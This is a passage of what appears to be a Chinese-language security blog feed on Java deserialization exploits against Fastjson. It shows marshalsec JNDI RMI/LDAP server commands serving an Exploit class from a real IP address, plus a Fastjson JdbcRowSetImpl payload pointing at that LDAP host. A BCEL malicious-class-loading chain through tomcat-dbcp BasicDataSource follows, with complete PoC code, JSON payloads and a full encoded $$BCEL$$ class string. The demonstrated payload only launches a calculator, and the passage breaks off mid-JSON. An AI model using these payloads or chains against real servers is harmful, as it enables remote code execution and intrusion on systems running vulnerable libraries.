class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>链子分析，在这里先触发getdataSourceName给dataSourceName赋值，再触发setter方法触发setAutoCommit，进而完成整条链子</p><p>开启http服务</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.<span class="keyword">server</span></span><br><span class="line"><span class="meta">#默认8000端口</span></span><br></pre></td></tr></table></figure><p>工具<strong>marshalsec-0.0.3-SNAPSHOT-all.jar</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">java</span> -cp marshalsec-<span class="number">0</span>.<span class="number">0</span>.<span class="number">3</span>-SNAPSHOT-<span class="literal">all</span>.jar marshalsec.jndi.RMIRefServer <span class="string">&quot;http://110.41.17.183:8080/#Exploit&quot;</span> <span class="number">5555</span></span><br><span class="line"><span class="attribute">java</span> -cp marshalsec-<span class="number">0</span>.<span class="number">0</span>.<span class="number">3</span>-SNAPSHOT-<span class="literal">all</span>.jar marshalsec.jndi.LDAPRefServer <span class="string">&quot;http://110.41.17.183:8080/#Exploit&quot;</span> <span class="number">5555</span></span><br></pre></td></tr></table></figure><p>在某ip，一般就为本机ip，开启RMI或者LDAP服务</p><p>FastJsonServer.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastJsonServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;ldap://110.41.17.183:5555/ExploitTest\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSON.parseObject(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ExploitTest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExploitTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ExploitTest</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//直接在构造方法中运行计算器</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体操作：</p><p>1.在服务器开启RMI或者LDAP服务</p><p>2.在同目录下开启http服务</p><p>3.将Exploit.java编译为class文件，放到上边开启服务的同目录下</p><p>4.执行FastJsonServer.java</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BCEL加载恶意类</title>
      <link href="/posts/18juyiuw0.html"/>
      <url>/posts/18juyiuw0.html</url>
      
        <content type="html"><![CDATA[<h1>BCEL</h1><p>下面将讲述bcel加载恶意类的详细过程</p><h2 id="BCEL是什么">BCEL是什么</h2><p>引用自CSDN</p><p>BCEL原本是Apache Jakarta的一个子项目，后来成为了Apache Commons的一个子项目。Apache Commons Collections想必大家都知道，就是常说的CC链，也是Apache Commons的一个子项目</p><p>BCEL主要用于分析、创建、操纵Java class文件，包含在原生原生JDK中（com.sun.org.apache.bcel），之所以包含在原生JDK主要原因可能是为了支撑Java XML的一些功能，Java XML功能包含了JAXP（Java API for XML Processing）规范，Java中自带的JAXP实现使用了Apache Xerces和Apache Xalan，Apache Xalan又依赖了BCEL，所以BCEL也被放入了标准库中。</p><p>Apache Xalan实现了其中XSLT相关的部分，其中包括xsltc compiler。</p><p>XSLTC Compiler就是一个命令行编译器，可以将一个xsl文件编译成一个class文件或jar文件，编译后的class被称为translet，可以在后续用于对XML文件的转换。其实就将XSLT的功能转化成了Java代码，优化执行的速度，如果我们不使用这个命令行编译器进行编译，Java内部也会在运行过程中存在编译的过程。</p><p>因为需要编译文件，实际上是动态生成Java字节码，BCEL正是一个Java处理字节码的库，所以Apache Xalan又依赖了BCEL</p><h2 id="CalssLoader">CalssLoader</h2><p>测试代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBCEL</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;\$\$BCEL\$\$xd&quot;</span>;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(str).newInstance();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先对于bcel的类加载机制com.sun.org.apache.bcel.internal.util.ClassLoader进行断点分析，可以得到如下代码</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240320223023444.png" alt="image-20240320223023444"></p><p>可见ClassLoader中对于$$BCEL$$字段进行了判断，如果存在就对class_name执行create_class方法，跟踪该方法，结果如下</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240320223944065.png" alt="image-20240320223944065"></p><p>个人感觉这里就是对bcel可以加载恶意类最直观的解释，根据代码逻辑，其截取了$$BCEL$$之后的字符，并将其解码，以类的形式返回，回到上层代码继续分析</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240320224545715.png" alt="image-20240320224545715"></p><p>得到clazz之后就到达了下面框框里的代码，调用了ClassLoader类的核心方法<code>defineClass</code>（定义一个Java类），如果我们在$$BCEL$$后街上恶意类的代码，在这里就会将其彻底解析，进而完成恶意类的构造。</p><h2 id="构造恶意类">构造恶意类</h2><p>了解了bcel加载恶意类的过程，下面就需要进行恶意类的构造，关键在于上面分析过的createClass方法，其中对于$$BCEL$$后的代码进行了解码处理，如下图</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240320225449811.png" alt="image-20240320225449811"></p><p>所以我们构造的时候需要将类进行同样的编码处理，测试代码如下</p><p><strong>TestBCEL.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBCEL</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//导入恶意类</span></span><br><span class="line">            <span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(classloader.Calc.class);</span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;\$\$BCEL\$\$&quot;</span>;</span><br><span class="line">        <span class="comment">//将恶意类的字节码编码后和\$\$BCEL\$\$拼接</span></span><br><span class="line">            str += Utility.encode(javaClass.getBytes(),<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">//利用bcel加载恶意类</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(str).newInstance();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Calc.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果，成功弹出计算器</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240320225755058.png" alt="image-20240320225755058"></p><h2 id="tomcat-dbcp分析">tomcat-dbcp分析</h2><p>下面将会将bcel和dbcp结合起来综合分析，利用链如下</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BasicDataSource<span class="selector-class">.getConnection</span>() &gt; <span class="built_in">createDataSource</span>() &gt; <span class="built_in">createConnectionFactory</span>()</span><br></pre></td></tr></table></figure><p>跟踪BasicDataSource#getConnection方法</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240321094112777.png" alt="image-20240321094112777"></p><p>继续跟踪BasicDataSource#createDataSource方法</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240321094218327.png" alt="image-20240321094218327"></p><p>可以发现在这里调用了BasicDataSource#createConnectionFactory，继续跟踪该方法</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240321094308710.png" alt="image-20240321094308710"></p><p>driverClassName和driverClassLoader都是该类下的成员变量（可控），并利用forName函数进行了类加载</p><p><strong>类加载机制</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 反射加载TestHelloWorld示例</span></span><br><span class="line">Class.forName(<span class="string">&quot;com.anbai.sec.classloader.TestHelloWorld&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ClassLoader加载TestHelloWorld示例</span></span><br><span class="line"><span class="built_in">this</span>.getClass().getClassLoader().loadClass(<span class="string">&quot;com.anbai.sec.classloader.TestHelloWorld&quot;</span>);</span><br></pre></td></tr></table></figure><p><code>Class.forName(&quot;类名&quot;)</code>默认会初始化被加载类的静态属性和方法，如果不希望初始化类可以使用<code>Class.forName(&quot;类名&quot;, 是否初始化类, 类加载器)</code>，而<code>ClassLoader.loadClass</code>默认不会初始化类方法。</p><p>至此，我们就可以利用Class.forName方法实现我们的恶意类加载，验证脚本如下</p><p><strong>FjBCEL.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.dbcp.dbcp.BasicDataSource;</span><br><span class="line"><span class="comment">//import org.apache.commons.dbcp.BasicDataSource;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FjBCEL</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, SQLException &#123;</span><br><span class="line">        <span class="comment">//fj1.2.24</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>();</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(classloader.Calc.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;\$\$BCEL\$\$&quot;</span>;</span><br><span class="line">        str += Utility.encode(javaClass.getBytes(),<span class="literal">true</span>);</span><br><span class="line">        <span class="type">BasicDataSource</span> <span class="variable">basicDataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BasicDataSource</span>();</span><br><span class="line">        basicDataSource.setDriverClassLoader(classLoader);</span><br><span class="line">        basicDataSource.setDriverClassName(str);</span><br><span class="line">        basicDataSource.getConnection();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果，成功弹出计算器</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240321094644237.png" alt="image-20240321094644237"></p><h2 id="BCEL-dbcp-fastjson">BCEL-dbcp-fastjson</h2><p>下面将会将上面所说的bcel，dbcp和fj结合起来，利用fj触发该利用链</p><p>利用链入口就是上面提到的BasicDataSource#getConnection方法，但该类并没有Connection成员变量，那他是如何调用的呢？</p><p><strong>FastJson中的 parse() 和 parseObject()方法都可以用来将JSON字符串反序列化成Java对象，parseObject() 本质上也是调用 parse() 进行反序列化的。但是 parseObject() 会额外的将Java对象转为 JSONObject对象，即 JSON.toJSON()。所以进行反序列化时的细节区别在于，parse() 会识别并调用目标类的 setter 方法及某些特定条件的 getter 方法(详见fj的触发详细过程)，而 parseObject() 由于多执行了 JSON.toJSON(obj)，所以在处理过程中会调用反序列化目标类的所有 setter 和 getter 方法。</strong></p><p>先给出测试POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.dbcp.dbcp.BasicDataSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FjBCEL</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, SQLException &#123;</span><br><span class="line">        <span class="comment">//fj1.2.24</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>();</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(classloader.Calc.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;\$\$BCEL\$\$&quot;</span>;</span><br><span class="line">        str += Utility.encode(javaClass.getBytes(),<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span></span><br><span class="line">                <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;        \&quot;aaa\&quot;: &#123;\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;                \&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource\&quot;,\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;                \&quot;driverClassLoader\&quot;: &#123;\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;                    \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;                &#125;,\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;                \&quot;driverClassName\&quot;: \&quot;&quot;</span>+str+<span class="string">&quot;\&quot;\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;        &#125;\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;    &#125;:\&quot;xxx\&quot;\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line"><span class="comment">//        BasicDataSource basicDataSource = new BasicDataSource();</span></span><br><span class="line"><span class="comment">//        basicDataSource.setDriverClassLoader(classLoader);</span></span><br><span class="line"><span class="comment">//        basicDataSource.setDriverClassName(str);</span></span><br><span class="line"><span class="comment">//        basicDataSource.getConnection();</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;aaa&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;driverClassLoader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;driverClassName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\$\$BCEL\$\$$l$8b$I$A$A$A$A$A$A$Am$91$c9N$c3$40$M$86$ffi$d3$s$N$v$85B$d9$f7$b5p$a0$H$8e$m$$$I$$$84E$U$c1y$3a$j$95$viR$rS$c4$hq$e6$C$88$D$P$c0C$n$3ca$V$Q$vv$fc$db$fel$x$_$afO$cf$A6$b1$e2$c2$c1$a8$8b1$8c$3b$980$7e$d2$c6$94$8b$i$a6m$cc$d8$98e$c8o$abP$e9$j$86lu$ed$9c$c1$da$8d$9a$92$a1$e4$abP$k$f5$3a$N$Z$9f$f1F$40J$d9$8f$E$P$cey$acL$fc$nZ$faR$r$s$t$C$9e$qA$c4$9b2$ae$ed$f2$40l18$db$o$f8$403$w$ad$f8m$7e$cdk$B$P$5b$b5$bd$h$n$bbZE$n$95$V$eb$9a$8b$abC$deM$91$b4$j$83$5b$8fz$b1$90$fb$ca$8c$u$Y$dc$86$e9$f5P$80kc$ce$c3$3c$Wh6$ad$p$3c$yb$89a$e8$l$b6$87e$b8$M$D$bfW$p$e9$bb$fa$b8$d1$96B3$M$7eK$a7$bdP$ab$OMv$5bR$7f$F$95$ea$9a$ff$a7$86$d6$b7$e4$8d$q$e4j$f5G$b6$aec$V$b6$b6$7e6$9c$c4$91$90IB$N$a5$$$ruz$f4Y$cc$85$a4cl$faI$e6$c9$80$99$T$c9$f6QT$p$cf$c8$e7$d6$l$c0$ee$d2$b4G6$9f$8aY$U$c9z$ef$F$e8G$89$bc$83$81$aff$9e$c2$80$f2$p2$e5$ec$3d$ac$8b$5b8$H$eb$f7$c8$df$a5z$81zsD1$c4$R$fa2$dcB$aa$daDv0H$a4$cf$JEX$U$97$v$g$a2$d7F$c6$b71lQ$a2$92$$5$f2$G$933$ed$e9n$C$A$A&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">:</span><span class="string">&quot;xxx&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当我们利用parse()方法的时候</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240321140349525.png" alt="image-20240321140349525"></p><p>结合payload可得在这里由于key不为null，所以调用了toString方法，key为<code>JSONObject</code>对象，会调用该对象的toString方法。而且JSONObject是Map的子类，当调用<code>toString</code>的时候，会依次调用该类的getter方法获取值（对于getConnection的触发还有一种解释<strong><a href="https://github.com/alibaba/fastjson/blob/master/src/main/java/com/alibaba/fastjson/util/TypeUtils.java#L1904">https://github.com/alibaba/fastjson/blob/master/src/main/java/com/alibaba/fastjson/util/TypeUtils.java#L1904</a></strong>），进而触发get链，上面已经给出了JSON.parse的测试代码，下面是JSON.parseObject的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"><span class="comment">//import org.apache.tomcat.dbcp.dbcp.BasicDataSource;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FjBCEL</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, SQLException &#123;</span><br><span class="line">        <span class="comment">//fj1.2.24</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>();</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(classloader.Calc.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;\$\$BCEL\$\$&quot;</span>;</span><br><span class="line">        str += Utility.encode(javaClass.getBytes(),<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;                \&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource\&quot;,\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;                \&quot;driverClassLoader\&quot;: &#123;\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;                    \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;                &#125;,\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;                \&quot;driverClassName\&quot;: \&quot;&quot;</span>+str+<span class="string">&quot;\&quot;\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;        &#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line"><span class="comment">//        BasicDataSource basicDataSource = new BasicDataSource();</span></span><br><span class="line"><span class="comment">//        basicDataSource.setDriverClassLoader(classLoader);</span></span><br><span class="line"><span class="comment">//        basicDataSource.setDriverClassName(str);</span></span><br><span class="line"><span class="comment">//        basicDataSource.getConnection();</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 